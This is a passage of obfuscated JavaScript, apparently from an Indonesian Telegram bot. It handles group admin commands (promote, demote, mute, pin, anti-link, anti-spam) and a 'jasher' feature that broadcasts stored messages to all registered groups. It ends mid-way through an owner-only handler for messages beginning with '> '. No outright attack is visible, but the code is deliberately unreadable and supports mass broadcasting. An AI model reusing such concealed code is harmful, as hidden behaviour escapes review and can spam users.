_0x240d04(0x5db):{if(_0x1ce978[_0x240d04(0xebd)](_0x1ce978[_0x240d04(0x2229)],'YueKZ'))_0x1ce978[_0x240d04(0x1d4b)](_0x457b9b,_0x240d04(0xb17)+_0x240d04(0x2a04)+_0x240d04(0x26d4)+_0x1ce978[_0x240d04(0x206e)](_0x438bdb,_0x4efd9d)+'*'),delete _0x2465d[_0x559aa2];else{if(!_0x56b430)return _0x476bfb(_0x240d04(0x9f7)+_0x240d04(0x96d)+_0x240d04(0x275)+_0x240d04(0xcd7));if(!_0x193ebe)return _0x1ce978[_0x240d04(0x2766)](_0x476bfb,_0x1ce978[_0x240d04(0x29e2)]);if(!await _0x1ce978['fRCzy'](_0x14d109,_0x63f3a3,_0xb65b97))return _0x1ce978[_0x240d04(0x2ee3)](_0x476bfb,_0x1ce978[_0x240d04(0x206)]);const _0x2d1e3a=_0x3b19d7[_0x240d04(0x19ed)]['id'];try{await _0x25840a[_0x240d04(0x1986)][_0x240d04(0x125a)+_0x240d04(0x28c5)](_0x63f3a3,_0x2d1e3a),_0x1ce978['ylEKY'](_0x476bfb,_0x1ce978['fUwXT']);}catch(_0x1e193a){_0x1ce978[_0x240d04(0x1037)](_0x476bfb,_0x1ce978['uBmhb'](_0x240d04(0x2720)+_0x240d04(0x2256)+':\x20',_0x1e193a['message']));}}}break;case _0x1ce978['SfpKo']:{if(_0x1ce978[_0x240d04(0x2c47)](_0x1ce978[_0x240d04(0x1e5a)],_0x1ce978[_0x240d04(0x1e5a)]))return _0x1ce978[_0x240d04(0x1878)](_0x273e9a,_0x240d04(0x19fe)+_0x240d04(0x23c6)+_0x240d04(0x1813)+_0x240d04(0x33b)+'\x20nama.umur'+_0x240d04(0x163d)+_0x240d04(0x2d8a));else{if(!_0x56b430)return _0x476bfb('Perintah\x20i'+_0x240d04(0x96d)+'ntuk\x20di\x20gr'+_0x240d04(0xcd7));if(!await _0x1ce978[_0x240d04(0x2136)](_0x14d109,_0x63f3a3,_0xb65b97))return _0x476bfb(_0x240d04(0x9f7)+_0x240d04(0x96d)+_0x240d04(0x98f)+_0x240d04(0x24dd));if(!_0x483c03[0x0])return _0x1ce978['dYwen'](_0x476bfb,_0x240d04(0x1a4f)+'rmat\x20/add\x20'+'628xxx');try{await _0x25840a[_0x240d04(0x1986)][_0x240d04(0x6fa)+_0x240d04(0x24c)](_0x63f3a3,_0x483c03[0x0]),_0x476bfb(_0x1ce978[_0x240d04(0x8a3)]);}catch(_0x5612a2){_0x1ce978[_0x240d04(0x1489)](_0x476bfb,_0x1ce978[_0x240d04(0x1372)](_0x1ce978[_0x240d04(0x2508)],_0x5612a2[_0x240d04(0x960)]));}}}break;case _0x1ce978['pVDKy']:{if(_0x1ce978[_0x240d04(0x314)](!_0x56b430,!_0x193ebe))return _0x476bfb(_0x1ce978[_0x240d04(0x7e7)]);if(!await _0x1ce978[_0x240d04(0x3cd)](_0x14d109,_0x63f3a3,_0xb65b97))return _0x1ce978['QdbpR'](_0x476bfb,_0x1ce978[_0x240d04(0x206)]);try{if(_0x1ce978['xvQoB'](_0x1ce978['lfBSv'],_0x1ce978[_0x240d04(0x49a)]))return _0x1ce978['xMUCV'](_0x1cc75b,_0x1ce978[_0x240d04(0x257a)]);else await _0x25840a[_0x240d04(0x1986)][_0x240d04(0x37f)+_0x240d04(0x2a62)](_0x63f3a3,_0x3b19d7[_0x240d04(0x19ed)]['id'],{'can_change_info':!![],'can_delete_messages':!![],'can_invite_users':!![],'can_restrict_members':!![],'can_pin_messages':!![],'can_promote_members':![]}),_0x1ce978[_0x240d04(0x185f)](_0x476bfb,'✅\x20Pengguna'+_0x240d04(0x238a)+_0x240d04(0x1fad)+'.');}catch(_0x33e523){_0x1ce978[_0x240d04(0x3bc)](_0x1ce978['RgUPk'],_0x1ce978[_0x240d04(0x2343)])?_0x476bfb(_0x1ce978[_0x240d04(0x574)](_0x1ce978[_0x240d04(0x22ce)],_0x33e523[_0x240d04(0x960)])):_0x1ce978[_0x240d04(0xa70)](_0x4c5558,_0x4531cf,_0x43fa85[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0xe65)]);}}break;case _0x1ce978[_0x240d04(0x1349)]:{if(!_0x56b430||!_0x193ebe)return _0x1ce978[_0x240d04(0x2418)](_0x476bfb,_0x1ce978[_0x240d04(0x228a)]);if(!await _0x1ce978['lXNKM'](_0x14d109,_0x63f3a3,_0xb65b97))return _0x1ce978[_0x240d04(0x180a)](_0x476bfb,_0x240d04(0x9f7)+'ni\x20hanya\x20u'+_0x240d04(0x98f)+_0x240d04(0x24dd));try{await _0x25840a[_0x240d04(0x1986)][_0x240d04(0x37f)+_0x240d04(0x2a62)](_0x63f3a3,_0x3b19d7[_0x240d04(0x19ed)]['id'],{'can_change_info':![],'can_delete_messages':![],'can_invite_users':![],'can_restrict_members':![],'can_pin_messages':![],'can_promote_members':![]}),_0x1ce978[_0x240d04(0xb08)](_0x476bfb,_0x240d04(0x29c)+_0x240d04(0x12c2)+'emote\x20dari'+'\x20admin.');}catch(_0x442719){_0x1ce978['tjXjb'](_0x476bfb,_0x1ce978[_0x240d04(0x1fbb)]+_0x442719[_0x240d04(0x960)]);}}break;case _0x240d04(0x1535):case _0x1ce978[_0x240d04(0x17ea)]:{if(!_0x56b430)return _0x476bfb(_0x240d04(0x9f7)+'ni\x20hanya\x20u'+_0x240d04(0x275)+_0x240d04(0xcd7));if(!await _0x14d109(_0x63f3a3,_0xb65b97))return _0x1ce978[_0x240d04(0x1433)](_0x476bfb,_0x1ce978[_0x240d04(0x206)]);try{await _0x25840a[_0x240d04(0x1986)][_0x240d04(0x1104)+_0x240d04(0x62f)](_0x63f3a3,{'can_send_messages':![]}),_0x1ce978[_0x240d04(0x491)](_0x476bfb,_0x1ce978['mwRul']);}catch(_0x697d29){if(_0x1ce978[_0x240d04(0x2212)](_0x1ce978[_0x240d04(0x10d1)],_0x1ce978['CyRcS']))return _0x1ce978['aFEee'](_0x83d40e,_0x1ce978[_0x240d04(0x17c4)]);else _0x1ce978[_0x240d04(0x18fa)](_0x476bfb,_0x1ce978[_0x240d04(0x22d1)](_0x1ce978['OYvlb'],_0x697d29['message']));}}break;case _0x240d04(0x105e):case _0x1ce978[_0x240d04(0x7d4)]:{if(_0x1ce978['OxHZA'](_0x1ce978[_0x240d04(0x1d3c)],_0x1ce978[_0x240d04(0x1e15)]))return _0x3c65a5(_0x240d04(0x4cc)+_0x240d04(0x4c7)+_0x240d04(0x1658)+_0x517a2c[_0x240d04(0x1fc7)](_0x7606fb)+'\x20'+_0x1ce978[_0x240d04(0x1af7)](_0x49e3b5,_0x4d466b)+(_0x240d04(0xbde)+'\x20*')+_0x4b340d+'craft\x20'+_0x1e40f3+('*\x20terlebih'+_0x240d04(0x1452)));else{if(!_0x56b430)return _0x1ce978[_0x240d04(0xdbd)](_0x476bfb,_0x1ce978[_0x240d04(0x2df6)]);if(!await _0x14d109(_0x63f3a3,_0xb65b97))return _0x476bfb(_0x240d04(0x9f7)+'ni\x20hanya\x20u'+_0x240d04(0x98f)+_0x240d04(0x24dd));try{await _0x25840a[_0x240d04(0x1986)]['setChatPer'+_0x240d04(0x62f)](_0x63f3a3,{'can_send_messages':!![],'can_send_media_messages':!![],'can_send_polls':!![],'can_send_other_messages':!![],'can_add_web_page_previews':!![]}),_0x476bfb(_0x1ce978[_0x240d04(0x27c8)]);}catch(_0x129b2d){if(_0x1ce978[_0x240d04(0x1c08)](_0x1ce978[_0x240d04(0xaae)],_0x1ce978['XuJxd']))_0x1ce978[_0x240d04(0x14be)](_0x476bfb,_0x1ce978['ihAKJ'](_0x1ce978[_0x240d04(0x1b6)],_0x129b2d['message']));else return _0x3cb86c[_0x240d04(0x15e)](_0x3c48e6),_0x1ce978[_0x240d04(0x4ac)](_0x4ef719,_0x1ce978[_0x240d04(0x1d60)]);}}}break;case _0x240d04(0x15e2):{if(_0x1ce978['BauXY'](_0x1ce978[_0x240d04(0x20bc)],_0x1ce978['mjRHG'])){if(_0x1ce978[_0x240d04(0x1077)](!_0x56b430,!_0x33cfb1))return _0x476bfb(_0x1ce978['pJJkq']);if(!await _0x1ce978['oiMwd'](_0x14d109,_0x63f3a3,_0xb65b97))return _0x1ce978[_0x240d04(0x2a63)](_0x476bfb,_0x240d04(0x9f7)+_0x240d04(0x96d)+_0x240d04(0x98f)+_0x240d04(0x24dd));try{await _0x25840a['telegram'][_0x240d04(0x2d2c)+'le'](_0x63f3a3,_0x33cfb1),_0x1ce978[_0x240d04(0x1fe6)](_0x476bfb,_0x1ce978[_0x240d04(0x200b)]);}catch(_0x53a98f){_0x1ce978[_0x240d04(0x247e)](_0x476bfb,_0x1ce978[_0x240d04(0x294f)](_0x1ce978[_0x240d04(0xe5c)],_0x53a98f[_0x240d04(0x960)]));}}else return _0x1ce978[_0x240d04(0x2bfe)](_0x4809ef,_0x1ce978['efQEj']);}break;case _0x1ce978[_0x240d04(0x2181)]:{if(_0x1ce978[_0x240d04(0xe48)](!_0x56b430,!_0x33cfb1))return _0x1ce978[_0x240d04(0x2373)](_0x476bfb,_0x1ce978[_0x240d04(0x1f6d)]);if(!await _0x1ce978[_0x240d04(0x1ed0)](_0x14d109,_0x63f3a3,_0xb65b97))return _0x1ce978[_0x240d04(0x2753)](_0x476bfb,'Perintah\x20i'+_0x240d04(0x96d)+_0x240d04(0x98f)+_0x240d04(0x24dd));try{_0x1ce978[_0x240d04(0x2574)]===_0x1ce978['zpsjk']?(_0x1716ac=_0x8a9a57[_0x240d04(0x2a20)][_0x240d04(0x1389)](),_0x4a4a4f=_0x1ce978[_0x240d04(0x1910)],_0x51bff6=_0x1ce978[_0x240d04(0x26ac)]):(await _0x25840a['telegram'][_0x240d04(0x20e8)+_0x240d04(0x2581)](_0x63f3a3,_0x33cfb1),_0x1ce978[_0x240d04(0x2709)](_0x476bfb,_0x1ce978[_0x240d04(0xd42)]));}catch(_0x92999f){_0x1ce978[_0x240d04(0x24e3)](_0x1ce978[_0x240d04(0x2a9e)],_0x1ce978[_0x240d04(0x2a9e)])?_0x5bd017['writeFileS'+_0x240d04(0xfd5)](_0x3862f2,_0x9e9b5f['stringify'](_0x227b48,null,0x2)):_0x1ce978[_0x240d04(0x143f)](_0x476bfb,_0x1ce978[_0x240d04(0x41a)](_0x1ce978[_0x240d04(0x2fe)],_0x92999f[_0x240d04(0x960)]));}}break;case _0x240d04(0x63d):{if(_0x1ce978[_0x240d04(0x1077)](!_0x56b430,!_0x197065))return _0x1ce978[_0x240d04(0xdea)](_0x476bfb,_0x1ce978['xceam']);if(!await _0x1ce978['vgaaB'](_0x14d109,_0x63f3a3,_0xb65b97))return _0x1ce978[_0x240d04(0x20ed)](_0x476bfb,'Perintah\x20i'+'ni\x20hanya\x20u'+'ntuk\x20admin'+_0x240d04(0x24dd));try{const _0x5f013b=_0x3b19d7[_0x240d04(0x2a20)][_0x240d04(0x1389)](),_0x25c42a=await _0x25840a[_0x240d04(0x1986)][_0x240d04(0x133e)+'k'](_0x5f013b[_0x240d04(0x2893)]),_0x268dd6=await(await _0x1ce978[_0x240d04(0x16ee)](fetch,_0x25c42a[_0x240d04(0x2899)]))[_0x240d04(0x59c)]();await _0x25840a[_0x240d04(0x1986)][_0x240d04(0x60b)+'to'](_0x63f3a3,{'source':_0x268dd6}),_0x1ce978[_0x240d04(0xaed)](_0x476bfb,_0x1ce978[_0x240d04(0x22ad)]);}catch(_0x374a5b){_0x476bfb(_0x1ce978[_0x240d04(0x8a4)]+_0x374a5b[_0x240d04(0x960)]);}}break;case _0x1ce978[_0x240d04(0x14c8)]:case'pin':{if(!_0x56b430||!_0x193ebe)return _0x1ce978[_0x240d04(0x2ac8)](_0x476bfb,_0x1ce978[_0x240d04(0x17b8)]);if(!await _0x14d109(_0x63f3a3,_0xb65b97))return _0x1ce978[_0x240d04(0xaea)](_0x476bfb,_0x1ce978[_0x240d04(0x206)]);try{await _0x25840a[_0x240d04(0x1986)]['pinChatMes'+_0x240d04(0x568)](_0x63f3a3,_0x3b19d7[_0x240d04(0x6bd)]),_0x1ce978['SxcoL'](_0x476bfb,_0x1ce978['kokeq']);}catch(_0x24eb91){_0x1ce978['eYxUq'](_0x476bfb,_0x1ce978[_0x240d04(0x534)](_0x1ce978[_0x240d04(0xd69)],_0x24eb91['message']));}}break;case _0x1ce978['htakh']:case _0x1ce978[_0x240d04(0x2478)]:{if(_0x1ce978[_0x240d04(0x66f)](_0x1ce978[_0x240d04(0x605)],_0x1ce978[_0x240d04(0x1521)])){if(!_0x56b430)return _0x476bfb(_0x1ce978[_0x240d04(0x2df6)]);if(!await _0x1ce978['fPAel'](_0x14d109,_0x63f3a3,_0xb65b97))return _0x476bfb(_0x1ce978[_0x240d04(0x206)]);try{if(_0x1ce978[_0x240d04(0x160c)](_0x1ce978[_0x240d04(0x1448)],_0x1ce978[_0x240d04(0x1448)]))await _0x25840a[_0x240d04(0x1986)]['unpinChatM'+'essage'](_0x63f3a3),_0x1ce978[_0x240d04(0xdea)](_0x476bfb,_0x240d04(0x2ac5)+_0x240d04(0x303)+_0x240d04(0x1568));else{if(_0x1ce978[_0x240d04(0x81c)](_0x36c4bf,_0x671b0))[_0x47959b,_0x317f1d]=[_0x53f509,_0x1ab283];return _0xe10ca0[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1652)](_0x1ce978[_0x240d04(0x2c7a)](_0x1ce978['AsHre'](_0x1d767d,_0x409536),_0x5530b0['random']()),_0x5f488d));}}catch(_0x28a6e2){_0x240d04(0x185c)!==_0x1ce978[_0x240d04(0x1b47)]?_0x1ce978['kPNaz'](_0x476bfb,_0x1ce978[_0x240d04(0x2755)](_0x1ce978[_0x240d04(0xde1)],_0x28a6e2[_0x240d04(0x960)])):(_0x1ce978['pcERx'](_0x5cc87b,_0x240d04(0xb17)+_0x240d04(0x2a04)+_0x240d04(0x26d4)+_0x1ce978[_0x240d04(0x282c)](_0x104778,_0x48ddf9)+'*'),delete _0x58b5c2[_0x4a0045]);}}else _0x32f820[_0x240d04(0x1d8c)]=_0x155dad;}break;case _0x1ce978[_0x240d04(0x1df0)]:{if(_0x1ce978['VrWNZ']('QSXAV',_0x1ce978['SbcvL']))_0x8330cb[_0x240d04(0x15e)](_0x1b16fd),_0x1ce978[_0x240d04(0x29f3)](_0x14515d,_0x1ce978['KlBPg'](_0x1ce978[_0x240d04(0x205e)],_0x7de5fc[_0x240d04(0x960)]));else{if(!_0x56b430)return _0x1ce978[_0x240d04(0xe18)](_0x476bfb,_0x1ce978['uSTJe']);if(!await _0x1ce978['YhKJD'](_0x14d109,_0x63f3a3,_0xb65b97))return _0x1ce978['VmrBD'](_0x476bfb,_0x1ce978[_0x240d04(0x20d8)]);if(_0x1ce978[_0x240d04(0x817)](_0x483c03[0x0],'on'))return antiLinkGroup[_0x63f3a3]=!![],saveAntiLink(),_0x476bfb(_0x240d04(0x1802)+_0x240d04(0x27bf)+'\x20grup\x20ini.');else{if(_0x1ce978[_0x240d04(0x13b1)](_0x483c03[0x0],_0x1ce978['LwcKO'])){if(_0x1ce978[_0x240d04(0x1ff7)](_0x1ce978[_0x240d04(0x2e42)],_0x1ce978[_0x240d04(0xa4d)]))return delete antiLinkGroup[_0x63f3a3],_0x1ce978[_0x240d04(0x1f4)](saveAntiLink),_0x1ce978[_0x240d04(0x1a89)](_0x476bfb,_0x1ce978[_0x240d04(0x2830)]);else _0x140987+=_0x240d04(0x2690)+'a\x20link\x20dow'+'nload\x20dite'+_0x240d04(0x861);}else return _0x476bfb(_0x1ce978[_0x240d04(0x26a8)]);}}}break;case _0x1ce978[_0x240d04(0x1dcb)]:{if(_0x1ce978['GNSqB'](_0x1ce978[_0x240d04(0x21e7)],_0x1ce978['skjaC'])){if(!_0x56b430)return _0x1ce978[_0x240d04(0x76c)](_0x476bfb,_0x1ce978[_0x240d04(0x3c8)]);if(!await _0x1ce978[_0x240d04(0x18da)](_0x14d109,_0x63f3a3,_0xb65b97))return _0x1ce978[_0x240d04(0x1048)](_0x476bfb,_0x1ce978[_0x240d04(0x1285)]);if(_0x1ce978['GdBUQ'](_0x483c03[0x0],'on'))return antiSpamGroup[_0x63f3a3]={'delay':0xfa0},_0x1ce978['bHktd'](saveAntiSpam),_0x1ce978[_0x240d04(0x285e)](_0x476bfb,_0x1ce978[_0x240d04(0x1ac5)]);else{if(_0x1ce978[_0x240d04(0x109d)](_0x483c03[0x0],_0x1ce978[_0x240d04(0x2a97)]))return delete antiSpamGroup[_0x63f3a3],_0x1ce978['CjQCA'](saveAntiSpam),_0x1ce978['oBaQq'](_0x476bfb,_0x1ce978['lWefv']);else{if(_0x1ce978[_0x240d04(0x1acd)]('PRMvF',_0x1ce978['PfpbB']))return _0x1ce978['cekEb'](_0x476bfb,_0x1ce978[_0x240d04(0x25c8)]);else _0x8357c0+='ID:\x20'+_0x3629ab['id']+('\x20-\x20Status:'+'\x20')+(_0x1ce978[_0x240d04(0x2195)](_0x23f42c[_0x240d04(0x2e69)]?.['user']?.[_0x240d04(0x2593)+'it'],null)?_0x240d04(0x15f):_0x1ce978['gMsbW'])+'\x0a',_0x35f199+=_0x2b1255[_0x240d04(0x181b)]+'\x0a',_0x2898c5+=_0x42830a[_0x240d04(0x268b)]+'\x20'+_0x4115d9['last_name']+'\x0a\x0a';}}}else _0xa47141[_0x240d04(0x15e)](_0x1772d1);}break;case _0x1ce978[_0x240d04(0x20ce)]:{if(_0x1ce978[_0x240d04(0x249e)](_0x1ce978[_0x240d04(0x1bdd)],_0x1ce978[_0x240d04(0x19c5)]))_0x55866d[_0x240d04(0x15e)](_0x2c074d),_0x1ce978['bOBBW'](_0x42e0db,_0x1ce978[_0x240d04(0xcd1)]);else{if(!_0x56b430)return _0x1ce978[_0x240d04(0x2644)](_0x476bfb,_0x1ce978[_0x240d04(0x32f)]);const _0x3e2342=await _0x25840a[_0x240d04(0x1986)]['getChatAdm'+_0x240d04(0x164d)+'s'](_0x63f3a3),_0x21de6e=_0x3e2342[_0x240d04(0x18c5)](_0x3a1985=>_0x3a1985[_0x240d04(0x1d73)]['id']==_0xb65b97),_0x5ddd6a=_0x3e2342['some'](_0x55bfcc=>_0x55bfcc[_0x240d04(0x1d73)]['id']==_0x25840a[_0x240d04(0xb44)]['id']);if(!_0x21de6e)return _0x1ce978[_0x240d04(0x1f68)](_0x476bfb,_0x1ce978[_0x240d04(0x591)]);if(!_0x5ddd6a)return _0x476bfb(_0x1ce978['xQDgE']);if(_0x1ce978[_0x240d04(0x2116)](_0x33cfb1,'on')){if(_0x240d04(0x2b48)===_0x1ce978[_0x240d04(0x9a9)])return _0x1ce978[_0x240d04(0x1414)](_0x17e1e7,_0x63f3a3),_0x1ce978[_0x240d04(0xe66)](_0x476bfb,_0x1ce978[_0x240d04(0x972)]);else _0x1ce978[_0x240d04(0x1500)](_0x54d2f9,_0x240d04(0xb17)+_0x240d04(0x2a04)+_0x240d04(0x26d4)+_0x1ce978[_0x240d04(0x4ab)](_0x203152,_0x3f7d09)+'*'),delete _0x5bcd7c[_0x3074eb];}else return _0x1ce978[_0x240d04(0xccc)](_0x33cfb1,_0x1ce978[_0x240d04(0x2a97)])?(_0x1ce978['RPWdW'](_0x19ca5e,_0x63f3a3),_0x1ce978[_0x240d04(0x1fe6)](_0x476bfb,_0x1ce978[_0x240d04(0xbce)])):_0x1ce978[_0x240d04(0x1fd9)](_0x476bfb,_0x1ce978['aukaT']);}}break;case _0x240d04(0x16eb):{if(!await _0x1ce978[_0x240d04(0x1551)](_0x14d109,_0x63f3a3,_0xb65b97)&&!_0x3cd341)return _0x1ce978[_0x240d04(0xccf)](_0x476bfb,_0x1ce978[_0x240d04(0x344)]);const _0x3e1078=_0x63f3a3[_0x240d04(0x2cb7)]();if(groupsData[_0x240d04(0x18c5)](_0x273ef4=>_0x273ef4['id']===_0x3e1078))return _0x1ce978[_0x240d04(0xaed)](_0x476bfb,_0x1ce978[_0x240d04(0x282b)]);let _0x2bcb7b={'text':_0x1ce978[_0x240d04(0x2bd)],'photo':null};try{if(_0x197065){const _0x292131=_0x3b19d7[_0x240d04(0x2a20)]['pop']();_0x2bcb7b[_0x240d04(0x2a20)]=await _0x1ce978['mhwhZ'](uploadPhotoFromTelegram,_0x292131['file_id']),_0x2bcb7b['text']=_0x33cfb1||_0x2bcb7b[_0x240d04(0x1d8c)];}else{if(_0x349462){const _0x59d8f4=_0x23c0de[_0x240d04(0x960)][_0x240d04(0x2a20)][_0x240d04(0x1389)]();_0x2bcb7b['photo']=await _0x1ce978[_0x240d04(0x2279)](uploadPhotoFromTelegram,_0x59d8f4[_0x240d04(0x2893)]),_0x2bcb7b[_0x240d04(0x1d8c)]=_0x33cfb1||_0x2bcb7b[_0x240d04(0x1d8c)];}else{if(_0x33cfb1){if(_0x1ce978[_0x240d04(0x239f)](_0x240d04(0x15cb),_0x1ce978[_0x240d04(0x5f2)]))return _0x1ce978[_0x240d04(0x804)](_0x1efa26,_0x240d04(0x1ef7)+_0x240d04(0x1794)+_0x240d04(0xcb9)+_0x240d04(0x16be));else _0x2bcb7b[_0x240d04(0x1d8c)]=_0x33cfb1;}}}}catch(_0x567aeb){if(_0x1ce978[_0x240d04(0x28e5)](_0x1ce978[_0x240d04(0x1666)],_0x1ce978[_0x240d04(0x1666)]))return _0x1ce978[_0x240d04(0x2dde)](_0x476bfb,_0x567aeb['message']);else _0x1ce978[_0x240d04(0x1ea7)](_0x413b4d,()=>_0x29b9fb(_0x2df213[_0x10cf39]),_0x2b0d05),_0x314fba+=0x1388;}groupsData[_0x240d04(0x7dc)]({'id':_0x3e1078,'jasher':_0x2bcb7b}),_0x1ce978[_0x240d04(0x233f)](saveGroups),_0x1ce978[_0x240d04(0x2d94)](_0x476bfb,_0x240d04(0x24af)+'hasil\x20dita'+_0x240d04(0x117b)+_0x240d04(0x2b04)+_0x3e1078+('`\x0aPesan\x20ja'+_0x240d04(0x1e97))+_0x2bcb7b[_0x240d04(0x1d8c)]+'\x22'+(_0x2bcb7b[_0x240d04(0x2a20)]?_0x240d04(0x1d15)+'simpan:\x20'+_0x2bcb7b[_0x240d04(0x2a20)]:''));}break;case _0x240d04(0x1dbc):{if(_0x1ce978[_0x240d04(0xf28)](_0x1ce978['vsjpx'],'VdBFF'))_0x1ce978[_0x240d04(0xf7b)](_0x298da1,_0x9c4d65,_0x381a30[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x1861)]);else{if(!await _0x1ce978[_0x240d04(0x1956)](_0x14d109,_0x63f3a3,_0xb65b97)&&!_0x3cd341)return _0x1ce978[_0x240d04(0x13f9)](_0x476bfb,_0x1ce978[_0x240d04(0x344)]);const _0x4ba17e=_0x63f3a3[_0x240d04(0x2cb7)](),_0x29f4cb=groupsData[_0x240d04(0x3de)](_0x147fcb=>_0x147fcb['id']===_0x4ba17e);if(!_0x29f4cb)return _0x1ce978[_0x240d04(0x20fb)](_0x476bfb,_0x1ce978[_0x240d04(0x268c)]);let _0x5d6d33=![];try{if(_0x197065){const _0x57b78d=_0x3b19d7[_0x240d04(0x2a20)][_0x240d04(0x1389)]();_0x29f4cb[_0x240d04(0x2c90)][_0x240d04(0x2a20)]=await uploadPhotoFromTelegram(_0x57b78d[_0x240d04(0x2893)]),_0x5d6d33=!![];}else{if(_0x349462){if(_0x1ce978[_0x240d04(0x155d)](_0x240d04(0x1e5d),_0x240d04(0x1e5d)))_0x1ce978[_0x240d04(0x138f)](_0x36b387,_0x1a086d,_0x195c28[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x1123)]);else{const _0x36c790=_0x23c0de[_0x240d04(0x960)][_0x240d04(0x2a20)][_0x240d04(0x1389)]();_0x29f4cb['jasher'][_0x240d04(0x2a20)]=await _0x1ce978[_0x240d04(0x238d)](uploadPhotoFromTelegram,_0x36c790['file_id']),_0x5d6d33=!![];}}}_0x33cfb1&&(_0x29f4cb[_0x240d04(0x2c90)][_0x240d04(0x1d8c)]=_0x33cfb1,_0x5d6d33=!![]);}catch(_0x183c83){return _0x476bfb(_0x183c83['message']);}if(!_0x5d6d33)return _0x476bfb(_0x240d04(0xa88)+_0x240d04(0x2e32)+_0x1ec495+(_0x240d04(0x2dc3)+_0x240d04(0x2a6b)+_0x240d04(0x5e5)+_0x240d04(0x1410)+_0x240d04(0x1482)+_0x240d04(0x2050)));_0x1ce978['SCKlr'](saveGroups),_0x1ce978[_0x240d04(0x1bc8)](_0x476bfb,_0x240d04(0xbf8)+_0x240d04(0xb18)+_0x240d04(0x1b18)+_0x240d04(0x196f)+_0x240d04(0x2220)+_0x29f4cb[_0x240d04(0x2c90)][_0x240d04(0x1d8c)]+'\x22'+(_0x29f4cb[_0x240d04(0x2c90)][_0x240d04(0x2a20)]?_0x240d04(0x1d15)+'simpan:\x20'+_0x29f4cb['jasher']['photo']:''));}}break;case _0x1ce978[_0x240d04(0x264e)]:{if(!await _0x1ce978[_0x240d04(0x2093)](_0x14d109,_0x63f3a3,_0xb65b97)&&!_0x3cd341)return _0x1ce978[_0x240d04(0x6fc)](_0x476bfb,_0x1ce978[_0x240d04(0x344)]);if(_0x1ce978[_0x240d04(0x178f)](groupsData[_0x240d04(0x2b45)],0x0))return _0x1ce978[_0x240d04(0x24a5)](_0x476bfb,_0x1ce978[_0x240d04(0x2a9a)]);let _0x3a62cc=groupsData[_0x240d04(0x16e6)]((_0x419d16,_0x1c1810)=>_0x1c1810+0x1+_0x240d04(0xa81)+_0x419d16['id']+'`\x20→\x20'+_0x419d16['jasher'][_0x240d04(0x1d8c)]+(_0x419d16[_0x240d04(0x2c90)][_0x240d04(0x2a20)]?_0x240d04(0x192):''))[_0x240d04(0x86e)]('\x0a');_0x476bfb('📋\x20*Daftar\x20'+_0x240d04(0xf90)+_0x240d04(0x1ffb)+_0x3a62cc);}break;case _0x1ce978['jXcHf']:{if(!await _0x1ce978['Tzauo'](_0x14d109,_0x63f3a3,_0xb65b97)&&!_0x3cd341)return _0x476bfb(_0x1ce978['MPISG']);const _0x5421ca=_0x63f3a3[_0x240d04(0x2cb7)](),_0xba474f=groupsData[_0x240d04(0x1f73)](_0x335d89=>_0x335d89['id']===_0x5421ca);if(_0x1ce978[_0x240d04(0x2c7)](_0xba474f,-0x1))return _0x1ce978[_0x240d04(0x2b0f)](_0x476bfb,_0x1ce978[_0x240d04(0x1583)]);groupsData[_0x240d04(0x19e9)](_0xba474f,0x1),saveGroups(),_0x1ce978[_0x240d04(0x25d0)](_0x476bfb,_0x240d04(0x1db0)+_0x240d04(0xa5e)+_0x240d04(0x1945)+_0x240d04(0xb5f)+_0x240d04(0x18b1)+_0x240d04(0x1665)+_0x5421ca+'`');}break;case _0x1ce978['ZIvvo']:{if(_0x1ce978[_0x240d04(0x1f5b)](_0x1ce978[_0x240d04(0x2551)],_0x240d04(0x53e)))return _0x44e1b8(_0x4a7de6),_0x1ce978[_0x240d04(0x13f1)](_0x20890d,_0x1ce978['oMBrZ']);else{if(!await _0x1ce978[_0x240d04(0x1b88)](_0x14d109,_0x63f3a3,_0xb65b97)&&!_0x3cd341)return _0x476bfb(_0x1ce978['MPISG']);if(_0x1ce978[_0x240d04(0x10fa)](groupsData[_0x240d04(0x2b45)],0x0))return _0x1ce978[_0x240d04(0x6fb)](_0x476bfb,_0x1ce978[_0x240d04(0x1949)]);let _0x121f10=0x0,_0x36d5d7=0x0;for(let _0x40faa0 of groupsData){try{_0x40faa0[_0x240d04(0x2c90)][_0x240d04(0x2a20)]?_0x1ce978[_0x240d04(0x1f14)](_0x1ce978[_0x240d04(0x1a55)],_0x1ce978[_0x240d04(0x1de3)])?(_0x1e42ad=_0x292255['document'],_0xc39121=_0x2227cb[_0x240d04(0x2ab6)]['file_name']||_0x1ce978[_0x240d04(0xfb6)],_0x41da22=_0x138097['document'][_0x240d04(0x8f8)]||_0x1ce978[_0x240d04(0x1831)]):await _0x25840a[_0x240d04(0x1986)][_0x240d04(0x2622)](_0x40faa0['id'],_0x40faa0[_0x240d04(0x2c90)][_0x240d04(0x2a20)],{'caption':_0x40faa0['jasher'][_0x240d04(0x1d8c)],'parse_mode':_0x1ce978[_0x240d04(0xa1b)]}):_0x1ce978['qFxRd'](_0x1ce978[_0x240d04(0x1021)],_0x1ce978[_0x240d04(0x1021)])?await _0x25840a['telegram'][_0x240d04(0xae8)+'e'](_0x40faa0['id'],_0x40faa0[_0x240d04(0x2c90)]['text'],{'parse_mode':'Markdown'}):(_0x52936f[_0x240d04(0x15e)](_0x34e695),_0x1ce978[_0x240d04(0x8b0)](_0x22c1e0,'Terjadi\x20ke'+_0x240d04(0x1e1b)+_0x240d04(0x1c1e)+'g.')),_0x121f10++;}catch{_0x36d5d7++;}}_0x476bfb('📢\x20Broadcas'+_0x240d04(0x1ec)+_0x240d04(0xe7a)+_0x240d04(0x12ad)+_0x121f10+_0x240d04(0x2820)+_0x36d5d7);}}break;default:if(_0x4869ac[_0x240d04(0xed0)]('>\x20')){if(_0x1ce978[_0x240d04(0x13b1)](_0x1ce978[_0x240d04(0x254f)],_0x1ce978[_0x240d04(0x2422)])){const _0x3bbf15=_0x25dd9c['map'](_0x20ca2c=>_0x20ca2c['id'])[_0x240d04(0xfc3)](_0x13b8f6=>_0x13b8f6!==_0x507406&&_0x178edc[_0x13b8f6]&&_0x3287f3[_0x13b8f6]['level']);return _0x3bbf15[_0x1ce978[_0x240d04(0x227f)](_0x14a10a,0x0,_0x3bbf15[_0x240d04(0x2b45)]-0x1)];}else{if(!_0x3cd341)return _0x1ce978[_0x240d04(0x19af)](_0x476bfb,_0x240d04(0xc37)+'er');try{let _0x438bdd=await 